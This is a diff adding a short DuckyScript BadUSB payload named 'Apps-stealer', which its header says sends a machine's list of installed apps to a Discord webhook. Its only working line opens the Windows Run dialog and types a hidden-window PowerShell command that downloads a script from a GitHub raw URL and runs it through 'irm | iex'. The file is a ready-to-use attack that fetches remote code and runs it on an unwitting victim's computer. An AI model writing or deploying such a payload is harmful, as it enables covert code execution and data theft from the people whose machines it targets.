@@ -1,0 +1,7 @@
+REM Title: Apps-stealer
+REM Description: Send list of downloaded apps to discord webhook
+REM Author: SuperJakov (https://github.com/SuperJakov)
+
+DELAY 500 
+GUI r 
+STRINGLN powershell -w h irm "https://raw.githubusercontent.com/SuperJakov/Badusb/main/apps-stealer/apps-stealer.ps1" | iex
